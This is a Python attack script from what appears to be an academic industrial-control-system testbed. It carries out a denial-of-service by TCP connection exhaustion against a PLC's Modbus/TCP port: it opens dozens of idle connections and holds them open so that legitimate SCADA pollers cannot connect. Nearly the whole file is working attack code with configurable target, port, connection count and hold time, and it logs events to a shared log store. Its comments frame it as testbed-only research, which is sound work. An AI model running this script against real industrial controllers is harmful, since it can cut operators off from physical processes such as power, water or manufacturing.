#!/usr/bin/env python3
"""
ASCEND-PG attacks/dos_conn_exhaust.py

Denial-of-Service via TCP connection exhaustion (MITRE ATT&CK for ICS:
T0814 — Denial of Service).

Complements the existing dos_attack.py (request flood). Instead of
flooding Modbus requests, this script opens many TCP connections to the
PLC's Modbus port and holds them open without sending data or reading
responses. This exhausts the PLC server's connection pool, preventing
legitimate SCADA clients from connecting.

This is a well-documented ICS vulnerability: most Modbus/TCP PLC
servers have a small connection limit (often 5–10 simultaneous
connections), and holding those slots starves the real SCADA poller.

Run this ON THE ATTACKER HOST inside the Mininet topology:
    python3 attacks/dos_conn_exhaust.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import socket
import time
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_CONNECTIONS = 50
DEFAULT_HOLD_TIME = 30
MODBUS_PORT = 502

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (list of dicts)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text())
        except json.JSONDecodeError:
            events = []
    events.append(event)
    log_path.write_text(json.dumps(events, indent=2))


def run_exhaust(target_ip: str, port: int = MODBUS_PORT,
                num_connections: int = DEFAULT_CONNECTIONS,
                hold_time: float = DEFAULT_HOLD_TIME) -> dict:
    """Open many TCP connections to the target without closing them.

    Each connection performs a TCP handshake but sends no Modbus data,
    tying up a server connection slot. All connections are held open
    for hold_time seconds, then released.

    Returns a summary dict for logging.
    """
    sockets = []
    connected = 0
    failed = 0

    print(f"[dos_conn_exhaust] Opening {num_connections} connections to "
          f"{target_ip}:{port} ...")

    for i in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, port))
            sockets.append(s)
            connected += 1
        except (socket.timeout, OSError) as exc:
            failed += 1
            if failed <= 3:
                print(f"[dos_conn_exhaust] Connection {i+1} failed: {exc}")
            elif failed == 4:
                print(f"[dos_conn_exhaust] (suppressing further failure messages)")

    print(f"[dos_conn_exhaust] {connected}/{num_connections} connections established, "
          f"{failed} failed")
    print(f"[dos_conn_exhaust] Holding connections open for {hold_time}s ...")

    try:
        time.sleep(hold_time)
    except KeyboardInterrupt:
        print("[dos_conn_exhaust] Interrupted — releasing connections early")

    # Clean up
    closed = 0
    for s in sockets:
        try:
            s.close()
            closed += 1
        except OSError:
            pass

    print(f"[dos_conn_exhaust] Released {closed} connections")

    return {
        "target": target_ip,
        "port": port,
        "attempted": num_connections,
        "connected": connected,
        "failed": failed,
        "hold_time": hold_time,
        "closed": closed,
    }


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG DoS — TCP connection exhaustion (T0814)")
    parser.add_argument("--target", required=True,
                        help="Target PLC IP to exhaust connections on")
    parser.add_argument("--port", type=int, default=MODBUS_PORT,
                        help=f"Modbus TCP port (default: {MODBUS_PORT})")
    parser.add_argument("--connections", type=int, default=DEFAULT_CONNECTIONS,
                        help=f"Number of connections to open (default: {DEFAULT_CONNECTIONS})")
    parser.add_argument("--hold-time", type=float, default=DEFAULT_HOLD_TIME,
                        help=f"Seconds to hold connections open (default: {DEFAULT_HOLD_TIME})")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0814",
        "action": "conn_exhaust_start", "target": args.target,
        "connections": args.connections, "hold_time": args.hold_time,
    })

    try:
        result = run_exhaust(args.target, port=args.port,
                             num_connections=args.connections,
                             hold_time=args.hold_time)
    except Exception as exc:
        log_event(log_path, {
            "stage": "attack", "technique": "T0814",
            "action": "conn_exhaust_error", "target": args.target,
            "error": str(exc),
        })
        print(f"[dos_conn_exhaust] FAILED: {exc}")
        raise

    log_event(log_path, {
        "stage": "attack", "technique": "T0814",
        "action": "conn_exhaust_result", "target": args.target,
        "result": result, "success": True,
    })
    print(f"[dos_conn_exhaust] Done — {result['connected']} connections held "
          f"for {result['hold_time']}s")


if __name__ == "__main__":
    main()
